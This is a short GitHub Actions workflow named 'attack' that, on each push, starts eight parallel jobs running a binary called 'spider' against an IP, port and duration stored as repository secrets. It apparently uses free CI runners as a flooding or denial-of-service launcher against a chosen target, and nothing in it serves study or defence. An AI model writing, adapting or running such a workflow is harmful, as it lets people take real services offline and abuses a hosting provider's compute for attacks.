name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8]
    steps:
    - uses: actions/checkout@v3
    - name: Make spider executable
      run: chmod +x spider
    - name: Run attack
      run: ./spider ${{ secrets.IP }} ${{ secrets.PORT }} ${{ secrets.TIME }} 350
